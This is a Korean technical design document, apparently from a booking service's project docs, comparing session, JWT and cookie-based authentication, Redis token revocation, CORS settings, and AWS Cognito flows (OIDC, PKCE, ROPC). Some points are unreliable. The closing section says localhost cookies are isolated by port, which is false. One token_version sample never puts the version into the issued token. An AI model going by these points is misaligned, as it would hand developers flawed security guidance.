  - 로드밸런서가 쿠키 또는 IP 주소 기반으로 서버 선택
  - ALB (Application Load Balancer): AWSALB 쿠키 사용
  - Nginx: ip_hash 또는 cookie 지시어 사용

장점:
  ✅ 세션 데이터 일관성 보장
  ✅ 서버 메모리 기반 세션 사용 가능

단점:
  ❌ 특정 서버에 부하 집중 가능
  ❌ 서버 다운 시 해당 서버의 모든 세션 소실
  ❌ 수평 확장 효율 저하 (특정 서버만 계속 사용)
  ❌ Auto-Scaling 시 세션 손실 (새 서버 추가/제거)

해결 방법 2: 중앙 세션 저장소 (Redis)
┌─────────┐
│  사용자  │
└────┬────┘
     │
     ▼
┌─────────────┐
│로드밸런서    │  ← 랜덤 라우팅 (Sticky Session 불필요)
└──┬──────┬───┘
   │      │
   ▼      ▼
┌────┐  ┌────┐
│서버A│  │서버B│
└─┬──┘  └──┬─┘
  │        │
  └────┬───┘
       ▼
   ┌──────┐
   │ Redis │  ← 모든 서버가 같은 세션 저장소 사용
   └──────┘

장점:
  ✅ 로드밸런서 랜덤 라우팅 가능 (부하 분산 최적화)
  ✅ 서버 다운/추가 시에도 세션 유지
  ✅ Auto-Scaling에 유리
  ✅ 수평 확장 용이

단점:
  ⚠️ Redis 의존성 (Redis 다운 시 모든 인증 불가)
  ⚠️ 네트워크 레이�시 추가 (Redis 조회 필요)

해결 방법 3: JWT Stateless (현재 방식)
┌─────────┐
│  사용자  │  JWT 토큰 = 서버 서명된 사용자 정보
└────┬────┘
     │ Authorization: Bearer eyJhbGc...
     ▼
┌─────────────┐
│로드밸런서    │  ← 랜덤 라우팅
└──┬──────┬───┘
   │      │
   ▼      ▼
┌────┐  ┌────┐
│서버A│  │서버B│  ← 둘 다 JWT 검증 가능 (Public Key 보유)
└────┘  └────┘
   │      │
   └──────┴─────→ 메모리/Redis 조회 불필요

장점:
  ✅ Sticky Session 불필요
  ✅ Redis 의존성 없음
  ✅ 완전한 Stateless (수평 확장 최적)

단점:
  ❌ 토큰 무효화 어려움 (로그아웃 즉시 반영 안 됨)
```

> ³ 참조: [AWS ALB Sticky Sessions](https://docs.aws.amazon.com/prescriptive-guidance/latest/load-balancer-stickiness/alb-cookies-stickiness.html)

**AWS ALB의 Sticky Session 설정**:

```bash
# ALB Target Group 설정
aws elbv2 modify-target-group-attributes \
  --target-group-arn arn:aws:elasticloadbalancing:... \
  --attributes \
    Key=stickiness.enabled,Value=true \
    Key=stickiness.type,Value=lb_cookie \
    Key=stickiness.lb_cookie.duration_seconds,Value=86400  # 1일

# ALB가 자동으로 AWSALB 쿠키 생성
Set-Cookie: AWSALB=abc123...; Path=/; Max-Age=86400

# 이후 모든 요청에서 이 쿠키를 보고 같은 서버로 라우팅
```

#### 2세대: JWT (Stateless Token)

```
클라이언트 → 로그인 → 서버
                      ↓
                   JWT 토큰 생성
                   { sub: "user123", email: "user@example.com" }
                   Private Key로 서명
                      ↓
클라이언트 ← JWT 토큰

이후 요청:
클라이언트 → Authorization: Bearer eyJhbGc... → 서버
                                               ↓
                                          Public Key로 검증
                                          클레임 추출
                                          DB 조회 없이 인증
```

**JWT Stateless 인증의 장단점과 보완 방법**:

```javascript
// 순수 Stateless JWT (DB/Redis 조회 없음)
장점:
  ✅ 서버 메모리 사용 안 함 (확장성 우수)
  ✅ DB/Redis 조회 불필요 (빠른 검증)
  ✅ 수평 확장 용이 (어느 서버에서나 검증 가능)

단점:
  ❌ 토큰 무효화 불가 (발급 후 제어 불가)
  ❌ 강제 로그아웃 불가 (만료 시간까지 유효)
  ❌ 권한 변경 즉시 반영 안 됨 (토큰 만료 후 갱신 필요)

문제 시나리오:
  1. 사용자가 로그아웃 → JWT는 여전히 유효
     → 탈취된 토큰으로 접근 가능

  2. 관리자가 사용자 권한 변경 (ADMIN → USER)
     → 기존 JWT는 여전히 ADMIN 권한 보유
     → 만료 시간(1시간)까지 ADMIN 권한으로 동작

  3. 보안 사고 발생 (토큰 탈취 의심)
     → 모든 JWT 무효화 방법 없음
     → Public Key 변경으로만 대응 가능 (모든 사용자 재로그인)
```

**Hybrid 방식: JWT + Redis/DB 토큰 관리**

```javascript
// 방법 1: Redis Whitelist (토큰 허용 목록)
// 로그인 성공 시
const accessToken = generateJWT(userId, '1h');
const refreshToken = generateJWT(userId, '30d');

// Redis에 토큰 저장 (Whitelist)
await redis.set(`access:${userId}:${tokenId}`, accessToken, 'EX', 3600);
await redis.set(`refresh:${userId}:${refreshTokenId}`, refreshToken, 'EX', 2592000);

// 인증 검증 시
async function authenticateRequest(accessToken) {
  // 1. JWT 서명 검증 (Public Key)
  const payload = verifyJWT(accessToken);

  // 2. Redis Whitelist 확인
  const exists = await redis.exists(`access:${payload.sub}:${payload.jti}`);
  if (!exists) {
    throw new Error('Token revoked');  // 로그아웃되었거나 무효화됨
  }

  return payload;
}

// 로그아웃 시 (즉시 무효화 가능)
await redis.del(`access:${userId}:${tokenId}`);
await redis.del(`refresh:${userId}:${refreshTokenId}`);

장점:
  ✅ 즉시 로그아웃 가능 (Redis에서 삭제)
  ✅ 강제 로그아웃 가능 (관리자가 특정 사용자 토큰 삭제)
  ✅ 보안 사고 시 전체 무효화 가능 (Redis flush)

단점:
  ⚠️ Redis 조회 필요 (Stateless 장점 일부 상실)
  ⚠️ Redis 다운 시 인증 불가 (단일 장애점)


// 방법 2: Redis Blacklist (토큰 차단 목록)
// 로그아웃 시
const payload = verifyJWT(accessToken);
const expiresIn = payload.exp - Math.floor(Date.now() / 1000);

// Redis에 차단된 토큰 저장 (만료 시간까지만)
await redis.set(`blacklist:${payload.jti}`, '1', 'EX', expiresIn);

// 인증 검증 시
async function authenticateRequest(accessToken) {
  const payload = verifyJWT(accessToken);

  // Blacklist 확인
  const isBlacklisted = await redis.exists(`blacklist:${payload.jti}`);
  if (isBlacklisted) {
    throw new Error('Token revoked');
  }

  return payload;
}

장점:
  ✅ 로그아웃 시에만 Redis 저장 (대부분 Stateless 유지)
  ✅ Redis 메모리 사용량 최소화 (로그아웃한 토큰만 저장)

단점:
  ⚠️ 강제 로그아웃 어려움 (모든 활성 토큰 추적 안 함)


// 방법 3: DB 기반 토큰 테이블
// 로그인 성공 시
const accessToken = generateJWT(userId, '1h');

await db.tokens.create({
  user_id: userId,
  token_id: tokenId,
  type: 'access',
  expires_at: new Date(Date.now() + 3600000),
  is_revoked: false
});

// 인증 검증 시
async function authenticateRequest(accessToken) {
  const payload = verifyJWT(accessToken);

  const tokenRecord = await db.tokens.findOne({
    token_id: payload.jti,
    is_revoked: false
  });

  if (!tokenRecord) {
    throw new Error('Token revoked or not found');
  }

  return payload;
}

// 로그아웃 시
await db.tokens.update(
  { token_id: tokenId },
  { is_revoked: true }
);

장점:
  ✅ 영구 감사 로그 (모든 토큰 발급/무효화 기록)
  ✅ 복잡한 쿼리 가능 (사용자별, 기간별 토큰 조회)
  ✅ Redis 다운 시에도 동작 (DB만 있으면 됨)

단점:
  ❌ 매 요청마다 DB 조회 (성능 영향)
  ❌ DB 부하 증가 (수평 확장 어려움)
```

**Hybrid 방식 (JWT + token_version 기반 Redis 검증)**

```yaml
기본 방식: Stateless JWT (일반 API 요청)
  - 대부분의 API: JWT 서명 검증만 수행
  - 빠른 응답 속도 유지
  - Redis 조회 없음 (확장성 우수)

민감한 작업: token_version 기반 추가 검증 (결제, 예매 히스토리 조회)
  - 결제 API: JWT + Redis token_version 검증
  - 예매 히스토리 조회: JWT + Redis token_version 검증
  - 개인정보 변경: JWT + Redis token_version 검증
  - 보안 수준 강화 (토큰 무효화 즉시 반영)

이유:
  - 대부분의 요청: Stateless 유지 (성능 최적화)
  - 민감한 작업: 추가 검증으로 보안 강화
  - 선택적 Redis 조회 (트래픽 대비 성능 균형)
```

**token_version 기반 검증 전략**:

```javascript
// 1. 로그인 성공 시 token_version 발급
async function issueTokens(userId) {
  // Cognito에서 JWT 발급
  const accessToken = await cognito.initiateAuth({...});

  // Redis에 token_version 저장
  const tokenVersion = crypto.randomUUID();
  await redis.set(`token_version:${userId}`, tokenVersion, 'EX', 3600);

  // JWT payload에 token_version 포함
  const payload = {
    sub: userId,
    email: user.email,
    token_version: tokenVersion  // ← token_version 추가
  };

  return { accessToken, tokenVersion };
}


// 2. 일반 API: JWT 서명 검증만 수행 (Redis 조회 없음)
@GetMapping("/v1/movies")
public ResponseEntity<List<Movie>> getMovies(@CookieValue String access_token) {
  // JWT 서명 검증만 수행 (빠른 응답)
  JwtPayload payload = jwtVerifier.verify(access_token);

  // Redis 조회 없이 바로 응답
  List<Movie> movies = movieService.findAll();
  return ResponseEntity.ok(movies);
}


// 3. 민감한 API: JWT + token_version 검증 (Redis 조회 추가)
@PostMapping("/v1/payments")
public ResponseEntity<Payment> createPayment(
    @CookieValue String access_token,
    @RequestBody PaymentRequest request) {

  // Step 1: JWT 서명 검증
  JwtPayload payload = jwtVerifier.verify(access_token);
  String userId = payload.getSub();
  String tokenVersion = payload.getCustomClaim("token_version");

  // Step 2: Redis에서 token_version 검증
  String validVersion = redisTemplate.opsForValue()
      .get("token_version:" + userId);

  if (validVersion == null || !validVersion.equals(tokenVersion)) {
    throw new UnauthorizedException("Token has been revoked");
  }

  // Step 3: 결제 처리
  Payment payment = paymentService.processPayment(userId, request);
  return ResponseEntity.ok(payment);
}


// 4. 예매 히스토리 조회: JWT + token_version 검증
@GetMapping("/v1/bookings/history")
public ResponseEntity<List<Booking>> getBookingHistory(
    @CookieValue String access_token) {

  // JWT 검증
  JwtPayload payload = jwtVerifier.verify(access_token);
  String userId = payload.getSub();
  String tokenVersion = payload.getCustomClaim("token_version");

  // Redis token_version 검증 (히스토리는 민감 정보)
  String validVersion = redisTemplate.opsForValue()
      .get("token_version:" + userId);

  if (validVersion == null || !validVersion.equals(tokenVersion)) {
    throw new UnauthorizedException("Token has been revoked");
  }

  // 예매 히스토리 조회
  List<Booking> bookings = bookingService.findByUserId(userId);
  return ResponseEntity.ok(bookings);
}


// 5. 로그아웃 시 token_version 무효화 (즉시 적용)
async function logout(userId) {
  // Redis에서 token_version 삭제
  await redis.del(`token_version:${userId}`);

  // → 민감한 API 접근 시 즉시 차단됨
  // → 일반 API는 JWT 만료(1시간)까지 접근 가능 (성능 유지)
}


// 6. 강제 로그아웃 (관리자 기능)
async function forceLogout(userId) {
  // token_version 즉시 무효화
  await redis.del(`token_version:${userId}`);

  // 로그 기록
  await auditLog.create({
    action: 'FORCE_LOGOUT',
    target_user: userId,
    admin_user: adminId,
    timestamp: new Date()
  });
}
```

**검증 수준별 API 분류**:

```yaml
Level 1: Stateless (JWT 서명 검증만)
  - GET /v1/movies (영화 목록 조회)
  - GET /v1/theaters (극장 목록 조회)
  - GET /v1/showtimes (상영 시간표 조회)
  - Redis 조회 없음, 최고 성능

Level 2: Hybrid (JWT + Redis token_version)
  - POST /v1/payments (결제 처리)
  - GET /v1/bookings/history (예매 히스토리)
  - POST /v1/bookings (예매 생성)
  - PUT /v1/users/profile (개인정보 변경)
  - DELETE /v1/users/account (계정 삭제)
  - Redis 1회 조회, 보안 강화

Level 3: Full Validation (JWT + Redis + DB)
  - POST /v1/admin/users/ban (사용자 정지)
  - GET /v1/admin/audit-logs (감사 로그)
  - PUT /v1/admin/permissions (권한 변경)
  - Redis + DB 조회, 최고 보안
```

**장점**:
- ✅ 대부분의 요청: Stateless 유지 (확장성 우수)
- ✅ 민감한 작업: 즉시 무효화 가능 (보안 강화)
- ✅ 선택적 Redis 조회 (성능과 보안 균형)
- ✅ 일반 사용자 영향 최소화 (로그아웃 후 1시간 동안 영화 목록 조회 가능)
- ✅ 마이크로서비스 환경에 적합

**단점 및 대응**:
- ⚠️ Redis 다운 시 민감한 API 접근 불가
  → Redis Cluster 구성으로 고가용성 확보
- ⚠️ token_version 불일치 시 사용자 경험 저하
  → 명확한 에러 메시지 제공 (재로그인 유도)

---

## 쿠키 선택의 기술적 근거

### 1. 브라우저의 자동 쿠키 전송 메커니즘

#### 쿠키 자동 전송 규칙

```javascript
// 쿠키 설정
Set-Cookie: access_token=eyJhbGc...;
            Domain=.ddcn41.com;
            Path=/;
            HttpOnly;
            Secure;

// 이후 모든 *.ddcn41.com 요청에 자동 포함
fetch('https://api.ddcn41.com/v1/bookings')
// → Cookie: access_token=eyJhbGc...

fetch('https://auth.ddcn41.com/v2/auth/me')
// → Cookie: access_token=eyJhbGc...

// 자동 전송 조건:
// 1. Domain이 일치해야 함 (.ddcn41.com)
// 2. Path가 일치해야 함 (/ 이므로 모든 경로)
// 3. Secure 플래그 시 HTTPS 필수
// 4. SameSite 정책 준수
```

#### 로컬스토리지 수동 전송 (번거로움)

```javascript
// 모든 API 호출마다 수동으로 토큰 추가
const token = localStorage.getItem('access_token');

fetch('https://api.ddcn41.com/v1/bookings', {
  headers: {
    'Authorization': `Bearer ${token}`
  }
});

// 문제점:
// 1. 모든 API 클라이언트 코드에 추가 필요
// 2. 토큰 갱신 시 모든 코드 업데이트 필요
// 3. 에러 처리 복잡 (401 Unauthorized 처리)
```

### 2. CORS와 Credentials

#### 쿠키 전송 시 CORS 설정

```javascript
// Frontend: credentials 옵션 필요
fetch('https://api.ddcn41.com/v1/bookings', {
  credentials: 'include'  // 쿠키 전송 허용
})

// Backend (Spring): CORS 설정
@Configuration
public class CorsConfig implements WebMvcConfigurer {
    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/**")
            .allowedOrigins(
                "https://ddcn41.com",
                "https://accounts.ddcn41.com",
                "https://admin.ddcn41.com"
            )
            .allowCredentials(true)  // 쿠키 허용
            .allowedMethods("GET", "POST", "PUT", "DELETE");
    }
}

// Lambda (Node.js): CORS 헤더
{
  'Access-Control-Allow-Origin': 'https://accounts.ddcn41.com',
  'Access-Control-Allow-Credentials': 'true',
  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
}
```

**주의사항**:
```javascript
// ❌ 잘못된 설정 (작동 안 함)
'Access-Control-Allow-Origin': '*'
'Access-Control-Allow-Credentials': 'true'
// → 에러: Credential mode 'include' with '*' origin not allowed

// ✅ 올바른 설정
'Access-Control-Allow-Origin': 'https://accounts.ddcn41.com'
'Access-Control-Allow-Credentials': 'true'
```

### 3. 브라우저 쿠키 제약 사항

#### Domain 설정 제약

```javascript
// accounts.ddcn41.com에서 Lambda 응답

// ✅ 가능: 현재 도메인
Set-Cookie: token=abc; Domain=accounts.ddcn41.com

// ✅ 가능: 상위 도메인 (leading dot)
Set-Cookie: token=abc; Domain=.ddcn41.com

// ❌ 불가: 다른 도메인
Set-Cookie: token=abc; Domain=.example.com
// → 브라우저가 차단 (보안상 이유)

// ❌ 불가: 하위 도메인
Set-Cookie: token=abc; Domain=api.accounts.ddcn41.com
// → 상위에서 하위로 설정 불가
```

#### SameSite 정책

> **참고**: SameSite 속성에 대한 자세한 설명은 [보안 측면 비교 - CSRF 공격](#csrf-cross-site-request-forgery-공격) 섹션 참조

**우리 프로젝트 설정**:
```javascript
Set-Cookie: access_token=eyJhbGc...;
            Domain=.ddcn41.com;
            SameSite=Lax;     // CSRF 공격 완화 (GET 요청만 허용)
            HttpOnly;         // XSS 방어
            Secure;           // HTTPS 전용
            Max-Age=3600      // 1시간
```

### 4. 로컬스토리지의 한계

#### Cross-Domain 토큰 공유 불가

**시도 1: iframe 통신 (복잡하고 불안전)**

```javascript
// accounts.ddcn41.com
<iframe id="token-sync" src="https://ddcn41.com/sync"></iframe>

// 토큰 전송
const iframe = document.getElementById('token-sync');
iframe.contentWindow.postMessage({
  type: 'SET_TOKEN',
  token: localStorage.getItem('access_token')
}, 'https://ddcn41.com');

// ddcn41.com에서 수신
window.addEventListener('message', (event) => {
  if (event.origin !== 'https://accounts.ddcn41.com') return;

  localStorage.setItem('access_token', event.data.token);
});

// 문제점:
// 1. iframe 로딩 시간 필요
// 2. postMessage 보안 위험 (origin 검증 필수)
// 3. 브라우저 호환성 문제
```

**시도 2: 서버 중계 (복잡하고 비효율적)**

```javascript
// accounts.ddcn41.com에서 로그인 성공
POST /auth/create-redirect-token
Body: { token: 'eyJhbGc...', redirectTo: 'https://ddcn41.com' }

// 서버에서 임시 토큰 생성
const tempCode = generateRandomCode();
redis.set(tempCode, token, 'EX', 60); // 1분 유효

// 리다이렉트
302 Found
Location: https://ddcn41.com/receive-token?code=temp123

// ddcn41.com에서 토큰 교환
GET /receive-token?code=temp123
→ 서버에서 Redis 조회
→ 토큰 반환
→ localStorage에 저장

// 문제점:
// 1. 2번의 네트워크 요청 (느림)
// 2. Redis 등 별도 저장소 필요
// 3. 경합 조건 (Race Condition) 가능
```

**쿠키 방식 (간단)**

```javascript
// accounts.ddcn41.com에서 로그인 성공
Set-Cookie: access_token=eyJhbGc...; Domain=.ddcn41.com; HttpOnly; Secure;

// ddcn41.com으로 리다이렉트
window.location.href = 'https://ddcn41.com';

// 끝! 추가 코드 불필요
// 브라우저가 자동으로 쿠키를 *.ddcn41.com 모든 요청에 포함
```

---

## AWS Cognito 선택 이유

### 1. AWS 생태계 통합

#### CloudWatch와의 완벽한 통합

```yaml
자동 로깅:
  - Cognito User Pool 이벤트 → CloudWatch Logs
  - SignUp, SignIn, ForgotPassword 등 모든 이벤트 자동 기록
  - 로그 그룹: /aws/cognito/userpool/{pool-id}

로그 예시:
  {
    "eventType": "SignIn_Success",
    "userPoolId": "ap-northeast-2_XXXXX",
    "userName": "user@example.com",
    "clientId": "abc123",
    "sourceIpAddress": "123.45.67.89",
    "timestamp": "2025-01-13T12:34:56.789Z"
  }
```

#### Lambda Triggers로 커스터마이징

```javascript
// Pre-Authentication Trigger
export async function handler(event) {
  // 로그인 전 커스텀 검증
  const { userPoolId, userName, request } = event;

  // 예: 특정 IP만 허용
  if (!isAllowedIP(request.userContextData.sourceIp)) {
    throw new Error('IP not allowed');
  }

  // 예: 비즈니스 로직 검증
  const user = await getUserFromDB(userName);
  if (user.status === 'SUSPENDED') {
    throw new Error('Account suspended');
  }

  return event;
}

// Post-Authentication Trigger
export async function handler(event) {
  // 로그인 성공 후 처리
  const { userName } = event;

  // 예: 로그인 시간 기록
  await updateLastLogin(userName);

  // 예: SNS 알림 발송
  await sns.publish({
    TopicArn: 'arn:aws:sns:ap-northeast-2:xxxxx:login-alerts',
    Message: `User ${userName} logged in`,
  });

  return event;
}

// Token Generation Trigger
export async function handler(event) {
  // JWT 클레임 수정
  event.response = {
    claimsOverrideDetails: {
      claimsToAddOrOverride: {
        'custom:role': 'ADMIN',
        'custom:department': 'Engineering'
      }
    }
  };

  return event;
}
```

**지원되는 Triggers**:
- Pre-Authentication: 로그인 전 검증
- Post-Authentication: 로그인 후 처리
- Pre-Token Generation: JWT 클레임 수정
- Post-Confirmation: 회원가입 확인 후 처리
- User Migration: 기존 사용자 마이그레이션
- Custom Message: 이메일/SMS 커스터마이징

### 2. 비용 효율성

#### 가격 구조

```yaml
무료 티어:
  - 월 활성 사용자 (MAU) 10,000명까지 무료
  - MAU: Monthly Active Users (한 달 동안 한 번 이상 로그인한 사용자)

유료 (MAU 초과 시):
  - 10,001 ~ 50,000: $0.0055/MAU
  - 50,001 ~ 100,000: $0.0046/MAU
  - 100,001+: $0.00325/MAU

예시 계산:
  # 테스트 환경 (MAU: 100명)
  월 비용: $0 (무료 티어)

  # 소규모 서비스 (MAU: 5,000명)
  월 비용: $0 (무료 티어)

  # 중규모 서비스 (MAU: 20,000명)
  초과 사용자: 10,000명
  월 비용: 10,000 × $0.0055 = $55

  # 대규모 서비스 (MAU: 100,000명)
  10,001~50,000: 40,000 × $0.0055 = $220
  50,001~100,000: 50,000 × $0.0046 = $230
  월 비용: $450
```

**비교: 자체 구축 vs Cognito**

```yaml
자체 인증 서버 구축:
  EC2 비용: $50/월 (t3.medium)
  RDS 비용: $30/월 (PostgreSQL)
  개발 시간: 2-3주 (인건비 $3,000+)
  유지보수: 지속적 패치 및 모니터링
  보안 감사: 연 1회 이상 ($1,000+)
  총 1년 비용: $1,000 + $3,000 (개발) + $1,000 (보안) = $5,000+

Cognito (MAU 5,000):
  월 비용: $0 (무료)
  개발 시간: 1주 (통합 작업)
  유지보수: AWS 자동 관리
  보안 감사: AWS SOC2/ISO 인증
  총 1년 비용: ~$500 (통합 작업만)
```

### 3. 확장성과 유연성

#### MFA (Multi-Factor Authentication) 추가

```javascript
// Cognito User Pool 설정
aws cognito-idp update-user-pool \
  --user-pool-id ap-northeast-2_XXXXX \
  --mfa-configuration OPTIONAL \
  --sms-configuration '{
    "SnsCallerArn": "arn:aws:iam::xxxxx:role/CognitoSNSRole",
    "ExternalId": "ddcn41-cognito"
  }'

// 사용자가 MFA 활성화 시
const response = await cognitoClient.send(new SetUserMFAPreferenceCommand({
  AccessToken: userAccessToken,
  SMSMfaSettings: {
    Enabled: true,
    PreferredMfa: true
  }
}));

// 로그인 시 자동으로 MFA 요구
// → SMS 인증 코드 전송
// → 사용자 입력 후 로그인 완료
```

#### Social Login (OAuth) 통합

```javascript
// Google OAuth 연동
aws cognito-idp update-identity-provider \
  --user-pool-id ap-northeast-2_XXXXX \
  --provider-name Google \
  --provider-details '{
    "client_id": "google_client_id",
    "client_secret": "google_client_secret",
    "authorize_scopes": "openid email profile"
  }'

// Facebook, Apple, SAML 등도 동일하게 추가 가능

// Hosted UI에서 자동으로 "Google로 로그인" 버튼 표시
// → 사용자 클릭
// → Google 인증 페이지
// → 인증 완료 후 Cognito에 사용자 생성
// → JWT 토큰 발급
```

#### 사용자 그룹 및 권한 관리

```javascript
// Admin 그룹 생성
aws cognito-idp create-group \
  --user-pool-id ap-northeast-2_XXXXX \
  --group-name ADMIN \
  --description "Administrator group" \
  --precedence 1

// 사용자를 그룹에 추가
aws cognito-idp admin-add-user-to-group \
  --user-pool-id ap-northeast-2_XXXXX \
  --username user@example.com \
  --group-name ADMIN

// JWT 토큰에 자동으로 그룹 정보 포함
{
  "sub": "a1b2c3d4-5678-90ab-cdef-1234567890ab",
  "email": "user@example.com",
  "cognito:groups": ["ADMIN"],  // 그룹 정보
  "cognito:username": "user@example.com"
}

// Spring Backend에서 권한 확인
@PreAuthorize("hasAuthority('ADMIN')")
@GetMapping("/admin/users")
public ResponseEntity<List<UserDto>> getUsers() {
    // ADMIN 그룹만 접근 가능
}
```

### 4. AWS 서비스 가용성과 안정성

#### AWS SLA (Service Level Agreement)

```yaml
Cognito User Pool:
  - SLA: 99.9% 가동 시간 보장
  - 다운타임: 월 43.8분 이하
  - 리전 이중화: 자동 (Multi-AZ)
  - 백업: 자동 (AWS 관리)

비교: 자체 구축 EC2:
  - SLA: 개발자 책임
  - 다운타임: 배포, 패치 시 발생
  - 이중화: 수동 구성 필요
  - 백업: 수동 설정 및 관리
```

#### 보안 인증

```yaml
AWS Cognito 인증:
  - SOC 2 Type II
  - ISO 27001
  - PCI DSS Level 1
  - HIPAA Eligible
  - GDPR Compliant

자체 구축 시:
  - 모든 인증 직접 획득 필요
  - 연간 감사 비용: $10,000+
  - 컴플라이언스 전담 인력 필요
```

---

## Cognito 인증 방식 비교

### 1. OIDC (OpenID Connect)

#### 표준 Authorization Code Flow

```
1. 사용자 → Cognito Hosted UI 리다이렉트
   https://myapp.auth.ap-northeast-2.amazoncognito.com/login?
     client_id=abc123&
     response_type=code&
     redirect_uri=https://accounts.ddcn41.com/callback

2. 사용자 → Hosted UI에서 로그인

3. Cognito → Redirect with Authorization Code
   https://accounts.ddcn41.com/callback?code=xyz789

4. Frontend → Lambda Auth Gateway
   POST /auth/callback
   Body: { code: 'xyz789' }

5. Lambda → Cognito Token Exchange
   POST https://myapp.auth.ap-northeast-2.amazoncognito.com/oauth2/token
   Body: {
     grant_type: 'authorization_code',
     code: 'xyz789',
     client_id: 'abc123',
     redirect_uri: 'https://accounts.ddcn41.com/callback'
   }

6. Cognito → Lambda
   {
     access_token: 'eyJhbGc...',
     id_token: 'eyJhbGc...',
     refresh_token: 'eyJhbGc...',
     expires_in: 3600
   }

7. Lambda → Frontend (Set HttpOnly Cookies)
   Set-Cookie: access_token=eyJhbGc...; HttpOnly; Secure; Domain=.ddcn41.com
   Set-Cookie: id_token=eyJhbGc...; HttpOnly; Secure; Domain=.ddcn41.com
   Set-Cookie: refresh_token=eyJhbGc...; HttpOnly; Secure; Domain=.ddcn41.com; Max-Age=2592000
```

**장점**:
- ✅ 가장 안전한 방식 (Authorization Code는 일회용)
- ✅ PKCE 추가 시 더욱 강화
- ✅ Refresh Token 지원
- ✅ Hosted UI로 빠른 구현

**단점**:
- ⚠️ Hosted UI 커스터마이징 제한
- ⚠️ 리다이렉트 플로우 (UX 다소 복잡)

### 2. OIDC + PKCE (Proof Key for Code Exchange)

#### PKCE 추가 단계

```javascript
// 1. Frontend에서 Code Verifier 생성 (무작위 문자열)
const codeVerifier = generateRandomString(128);
sessionStorage.setItem('code_verifier', codeVerifier);

// 2. Code Challenge 생성 (SHA-256 해시)
const codeChallenge = base64UrlEncode(sha256(codeVerifier));

// 3. Cognito Hosted UI 리다이렉트 (code_challenge 포함)
https://myapp.auth.ap-northeast-2.amazoncognito.com/login?
  client_id=abc123&
  response_type=code&
  redirect_uri=https://accounts.ddcn41.com/callback&
  code_challenge=CHALLENGE_STRING&
  code_challenge_method=S256

// 4. Authorization Code 받은 후 Token Exchange 시 Code Verifier 포함
POST /oauth2/token
Body: {
  grant_type: 'authorization_code',
  code: 'xyz789',
  client_id: 'abc123',
  redirect_uri: 'https://accounts.ddcn41.com/callback',
  code_verifier: CODE_VERIFIER  // ✅ PKCE 검증
}

// Cognito는 code_challenge와 code_verifier를 비교하여 검증
// SHA-256(code_verifier) === code_challenge
```

**PKCE의 보안 강화**:
```
공격 시나리오 (PKCE 없이):
  1. 공격자가 Authorization Code 가로챔 (xyz789)
  2. 공격자가 직접 Token Exchange 시도
  3. ✅ 성공 (client_id만 알면 가능)

PKCE 사용 시:
  1. 공격자가 Authorization Code 가로챔 (xyz789)
  2. 공격자가 Token Exchange 시도
  3. ❌ 실패 (code_verifier를 모름)
  4. code_verifier는 Frontend에만 존재 (공격자 접근 불가)
```

**장점**:
- ✅ Authorization Code Interception 공격 방어
- ✅ Public Client (SPA)에 최적
- ✅ OAuth 2.1에서 권장

**단점**:
- ⚠️ Hosted UI 커스터마이징 여전히 제한

### 3. ROPC (Resource Owner Password Credentials)

#### Direct Password Flow

```javascript
// Frontend에서 직접 Cognito로 로그인
const response = await cognitoClient.send(new InitiateAuthCommand({
  AuthFlow: 'USER_PASSWORD_AUTH',  // ROPC
  ClientId: 'abc123',
  AuthParameters: {
    USERNAME: 'user@example.com',
    PASSWORD: 'SecurePass123!'
  }
}));

// 즉시 토큰 반환 (리다이렉트 없음)
{
  AuthenticationResult: {
    AccessToken: 'eyJhbGc...',
    IdToken: 'eyJhbGc...',
    RefreshToken: 'eyJhbGc...',
    ExpiresIn: 3600
  }
}

// Lambda Auth Gateway로 전달하여 쿠키 설정
POST /v2/auth/login
Body: { email: 'user@example.com', password: 'SecurePass123!' }

// Lambda 응답
Set-Cookie: access_token=eyJhbGc...; HttpOnly; Secure; Domain=.ddcn41.com
```

**장점**:
- ✅ 커스텀 UI 완전 자유
- ✅ 리다이렉트 없음 (UX 단순)
- ✅ QuickFill 등 개발 편의 기능 구현 가능

**단점**:
- ❌ OAuth 2.0에서 Deprecated
- ❌ 보안성 낮음 (비밀번호 직접 전송)
- ❌ Third-party 앱에 부적합

**ROPC가 Deprecated된 이유**:
```
1. 피싱 위험:
   - 사용자가 제3자 앱에 비밀번호 직접 입력
   - 제3자 앱이 비밀번호를 저장할 수 있음

2. MFA 미지원:
   - ROPC는 Multi-Factor Authentication 불가
   - Authorization Code Flow는 MFA 자연스럽게 지원

3. 권한 범위 제어 어려움:
   - ROPC는 전체 권한 부여
   - Authorization Code Flow는 Scope로 세밀한 권한 제어
```

**우리 프로젝트에서 ROPC를 선택한 이유**:
```yaml
이유:
  - 기존 구현이 이메일 + 비밀번호 방식
  - 테스트 빌드에서 QuickFill 기능 필요
  - 커스텀 UI 구현 필요 (로그인 페이지 디자인 자유도)
  - 자사 앱이므로 피싱 위험 낮음

향후 계획:
  - Production: OIDC + PKCE로 전환 고려
  - Hosted UI 또는 Amplify UI 사용
  - MFA 지원
```

### 4. 인증 방식 비교표

| 특성 | OIDC (Authorization Code) | OIDC + PKCE | ROPC |
|------|---------------------------|-------------|------|
| **보안성** | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐ |
| **UX 복잡도** | 중간 (리다이렉트) | 중간 (리다이렉트) | 낮음 (즉시 로그인) |
| **커스터마이징** | 제한적 (Hosted UI) | 제한적 (Hosted UI) | 완전 자유 |
| **MFA 지원** | ✅ | ✅ | ❌ |
| **Social Login** | ✅ | ✅ | ❌ |
| **Refresh Token** | ✅ | ✅ | ✅ |
| **Third-party 적합** | ✅ | ✅ | ❌ |
| **OAuth 2.1 권장** | ✅ | ✅ | ❌ (Deprecated) |

---

## 로컬 개발 환경의 제약과 해결

### 1. localhost 포트 분리 문제

#### 문제 상황

```
로컬 개발 환경:
  localhost:3000  → Client Frontend (Vite)
  localhost:3001  → Admin Frontend (Vite)
  localhost:3002  → Accounts Frontend (Vite)
  localhost:8080  → Queue Service (Spring)
  localhost:8081  → Main Service (Spring)
  localhost:4000  → Lambda Auth Mock (Node.js)

쿠키 설정:
  Set-Cookie: access_token=eyJhbGc...; Domain=localhost; HttpOnly; Secure;

  ❌ localhost:3000에서 설정한 쿠키는 localhost:3001에서 접근 불가
  ❌ 포트가 다르면 다른 Origin으로 간주
```

#### Same-Origin Policy 엄격 적용

```
Origin 비교:
  http://localhost:3000  → Origin 1
  http://localhost:3001  → Origin 2 (다름)
  http://localhost:3002  → Origin 3 (다름)

→ 각 Origin의 쿠키는 완전히 독립적
→ Domain=localhost로 설정해도 포트 구분됨
```

